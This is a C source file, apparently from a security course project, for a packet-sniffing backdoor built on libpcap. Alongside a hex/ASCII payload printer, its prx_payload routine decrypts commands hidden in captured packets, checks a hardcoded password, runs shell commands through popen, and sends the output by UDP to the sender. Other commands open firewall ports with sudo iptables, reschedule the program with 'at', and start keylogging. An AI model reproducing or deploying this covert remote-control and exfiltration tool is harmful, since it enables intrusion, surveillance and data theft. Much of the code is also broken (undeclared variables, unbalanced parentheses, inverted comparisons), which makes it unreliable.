/*---------------------------------------------------------------------------------------------
--	SOURCE FILE:	proc_payload.c - Set of function to process and print the packet payload
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 4, 2016
--
--	REVISIONS:		(Date and nic_description)
--
--
--	DESIGNERS:		Based on the code by Martin Casado, Aman Abdulla
--				Modified & redesigned: Aman Abdulla: May 4, 2016
--
--	PROGRAMMER:		John Warren
--
--	NOTES:
--	This file contain thw functions to process and print out the payload data in captured
--      datagrams. The payload content is printed out as ASCII and hex.
--  (JW-2018) added prx_payload - to handle request and send back encrypted response.
-------------------------------------------------------------------------------------------------*/

#include "pkt_sniffer.h"

#define BUFLEN 1024

char *ireqs[5] = {"sleep","exit", "dormant", "fwrule", "send"};
char *sreqs[21] = {"ls", "pwd", "passwd", "env", "ps", "df", "du", "nmap", "uptime", "who", "cd", "find","uname", "ln", "mv", "mkdir", "rmdir", "chmod", "chown", "adduser","touch"};
char *xreqs[2] = {"kblog", "monitor"};

char * rcmd ,* request, * sender, *proto, * resport, *fname;
int durn;

void error(char *msg) {
    perror(msg);
    exit(0);
}

// This function will print payload data
void print_payload (const u_char *payload, int len){

	int len_rem = len;
	int line_width = 16;		// number of bytes per line
	int line_len;
	int offset = 0;			// offset counter
	const u_char *ch = payload;

	if (len <= 0){
		return;
	}
	// does data fits on one line?
	if (len <= line_width){
		print_hex_ascii_line (ch, len, offset);
		return;
	}

	// data spans multiple lines
	for ( ;; ){
		// determine the line length and print
		line_len = line_width % len_rem;
		print_hex_ascii_line (ch, line_len, offset);

                // Process the remainder of the line
		len_rem -= line_len;
		ch += line_len;
		offset += line_width;

                // Ensure we have line width chars or less
		if (len_rem <= line_width)
                {
			//print last line
			print_hex_ascii_line (ch, len_rem, offset);
			break;
		}
	}
 }

// Print data in hex & ASCII
void print_hex_ascii_line (const u_char *payload, int len, int offset){

	int i;
	int gap;
	const u_char *ch;

	// the offset
	printf("%05d   ", offset);

	// print in hex
	ch = payload;
	for (i = 0; i < len; i++)
        {
		printf("%02x ", *ch);
		ch++;
		if (i == 7)
                    printf(" ");
	}

	// print spaces to handle a line size of less than 8 bytes
	if (len < 8)
		printf(" ");

	// Pad the line with whitespace if necessary
	if (len < 16)
        {
		gap = 16 - len;
		for (i = 0; i < gap; i++)
                    printf("   ");
        }
	printf("   ");

	// Print ASCII
	ch = payload;
	for (i = 0; i < len; i++)
        {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf ("\n");
}

void prx_payload(const u_char *payload){
	int i,j,plen=0, alen, len;
	char reqt, msg[512], msgx[512], * stringp, *pass="";

	// decrypt message
	len = strlen(payload);
	for (i=0;i<len;i++){msg[i]=swapIN(payload[i]);}

	// check password
	if((plen = atoi(strtok(msg, " ")))<1){
		printf("\nInvalid message received %u...returning\n\n",plen);
		return;
	}

	printf("\nValid message received %s\n\n",msg);
	pass = strtok(NULL, " ");

	if (strncmp(pass,"^Dat@C0Mm$",strlen("^Dat@C0Mm$"))!=0){
		printf("\nInvalid password received %s...returning\n\n",pass);
		return (char*)-1;	
	}
	printf("Password Confirmed\n");

	sender = strtok(NULL," ");
	proto = strtok(NULL," ");
	resport = strtok(NULL," ");
	durn = atoi(strtok(NULL," "));
	request = strtok(NULL,"\0");
	strncpy(msgx,request,80);
	//rcmd = strtok(msgx," ");

	printf("Packet decoded\n");

	printf("\n\n$ %s!!!\n\t===>send results to %s (%s):%s %d\n",request,sender,proto,resport, dur);

	// internal, system, special or unknown command
	reqt = get_rtype(request);
	printf("list number %d\n", reqt);
	switch (reqt){
		case 3:
			do_sys(request);
			break;
		case 2:
			do_special(request);
			break;
		case 1:
			do_internal(request);
			break;
		default:
			printf("unknown or invalid command\n");
			break;
	}
	// system requests
	// do_sys(request);

	// internal requests
	// do_int(request);
	// special requests
	// do_special(request);
}

char in_list(char *list[],char * item, int k){
	int i;
    printf("%s, %d\n",item, k);
	
    for(i=0;i<k;i++){
        if(strcmp(item,list[i])==0)
            return ++i;
    }
	return -1;
}

char get_rtype(char * request){
	char seq, str[80];
    char * item;
    int j;
  
	// find out if system, special or internal command, return 3,2,1
    j = sizeof(sreqs)/sizeof(sreqs[0]);
	if((seq = in_list(sreqs, rcmd,j))>0)
		return 3;

	
    j = sizeof(ireqs)/sizeof(ireqs[0]);
	if((seq = in_list(ireqs, rcmd,j))>0)
		return 1;

    j = sizeof(xreqs)/sizeof(xreqs[0]);
	if((seq = in_list(xreqs, rcmd,j))>0)
		return 2;
	
    return 0;
}

char *get_fname(char *request){
    char cdt[12], str[80];
    time_t rawtime;
    struct tm* tmi;
	fname = calloc(32,sizeof(char));

    time(&rawtime);
    tmi = localtime(&rawtime);
    strftime(cdt,16,"%y%m%d%H%M",tmi);
	sprintf(fname,"%s.%s",cdt,rcmd);
	//printf ("In Get FName%s %s %s\n",cdt, cmd, fname);
	return fname;
}

int send_info(FILE * fh, char * fname){
	char line[256];
	printf("In send_info function - %s\n\n",fname);
	struct sockaddr_in si_other;
    int s, i, slen=sizeof(si_other);
    char buf[BUFLEN];

	if ((s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))==-1)
    	error("socket");

	memset((char *) &si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(resport);
    if (inet_aton(sender, &si_other.sin_addr)==0) {
		fprintf(stderr, "inet_aton() failed\n");
    	exit(1);
    }
 	while(fgets(buf,sizeof(buf),fh)){
		if (sendto(s, buf, BUFLEN, 0, &si_other, slen)==-1)
			error("unable to send");
	}
	close (s);
}

char do_sys(char* request){
	FILE *respp;
	char *fname, output[81];
	fname = get_fname(request);

	respp = popen(request, "r");
	if (!respp){
		fprintf(stderr,"unable to capture output\n");
		return -1;
	}
	printf("In System Command function - %s\n%s\n",fname, request);
	//while(fgets(output, 80, respp)!=NULL){puts(output);}
	send_info(respp, fname);
	fclose(respp);

	/*
	// send_info();
	printf()
	if(pclose(response)!=0)	
		fprintf(stderr,"other output error\n");
	return 1;
	*/
}

char do_internal(char * request){
	char *fname, *copy, cmd[32], path[32];
	FILE *respp;
	fname = get_fname(request);
	printf("In Internal Command function - %s\n%s\n",fname, request);
	copy = strndup(request,79);
	cmd = strtok(copy," ");
	arg = strtok(NULL," ");

	if(strncmp(request,"fwrule",6){
		resp = fwrule(request);
		do_sys(respp);
	} else if(strncmp(request,"send",4){
		send_info(arg,fname);
	} else if(strncmp(request,"sleep",5){
		sleep(arg);
	} else if(strncmp(request,"exit",4){
		exit(0);
	} else if(strncmp(request,"dormant",7){
		printf ("Untested 'cron' job ... Exiting\n\n");
		system("at now +2m -f ./sns");  // need to build string from args
		exit(0);
		//dormant(arg);
	}
}

char do_special(char * request){
	char *fname, *copy, cmd[32], path[32];
	fname = get_fname(request);
	printf("In Special Command function - %s\n%s\n",fname, request);
	copy = strndup(request,79);
	cmd = strtok(copy," ");
	arg = strtok(NULL," ");
	if(strncmp(request,"monitor",7){
		dirmon(arg, durn);
	} else if(strncmp(request,"kblog",5){
		keylog(arg, durn);
	}
}

fwrule(char* rule){
	char *copy, *str, *cmd, * type, *port;
	copy = calloc(80,sizeof(char));
	cmd = strtok(copy," ");
	type = strtok(NULL," ");
	port = strtok(NULL," ");

	// open inbound
	str = calloc(120,sizeof(char));
	sprintf(str,"sudo iptables -A INPUT -p %s --dport %s -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT",type, port);
	system(str);
	//open outbound
	str = calloc(120,sizeof(char));
	sprintf(str,"sudo iptables -A OUTPUT -p %s --sport %s -m conntrack --ctstate ESTABLISHED -j ACCEPT",type, port);
	system(str);
	system("iptables -L");
}